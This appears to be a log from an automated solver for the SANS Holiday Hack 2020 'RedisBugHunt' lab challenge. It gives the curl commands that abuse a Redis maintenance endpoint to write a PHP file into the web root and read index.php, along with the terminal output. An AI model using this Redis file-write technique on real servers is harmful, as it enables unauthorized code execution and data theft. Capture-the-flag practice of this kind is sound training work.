2020-12-26 21:35:42.164 +00:00 [VRB] Started SANS Holiday Hack, December 2020
2020-12-26 21:35:42.182 +00:00 [VRB] Using CTF runner 0.1.0-alpha.19
2020-12-26 21:35:42.184 +00:00 [VRB] Running challange RedisBugHunt
2020-12-26 21:35:42.185 +00:00 [INF] curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/some.php --output -



                We need your help!!

                The server stopped working, all that's left is the maintenance port.

                To access it, run:

                curl http://localhost/maintenance.php

                We're pretty sure the bug is in the index page. Can you somehow use the
                maintenance page to view the source code for the index page?
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php readfile('\''index.php'\'') ?>'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=save
                Running: redis-cli --raw -a '<password censored>' 'save'

                OK
                player@58394353a03f:~$ curl http://localhost/some.php
                Warning: Binary output can mess up your terminal. Use "--output -" to tell 
                Warning: curl to output it to your terminal anyway, or consider "--output 
                Warning: <FILE>" to save to a file.
                player@58394353a03f:~$ curl http://localhost/some.php --output -
                REDIS0009�      redis-ver5.0.3�
                �edis-bits�@�ctime�ª�_used-mem
                 aof-preamble��� test<?php

                # We found the bug!!
                #
                #         \   /
                #         .\-/.
                #     /\ ()   ()
                #       \/~---~\.-~^-.
                # .-~^-./   |   \---.
                #      {    |    }   \
                #    .-~\   |   /~-.
                #   /    \  A  /    \
                #         \/ \/
                # 

                echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
                ?>
                example1The site is in maintenance modexample2#We think there's a bug in index.php���'i hplayer@58394353a03f:~$ 

            
2020-12-26 21:35:42.188 +00:00 [VRB] Challenge RedisBugHunt completed
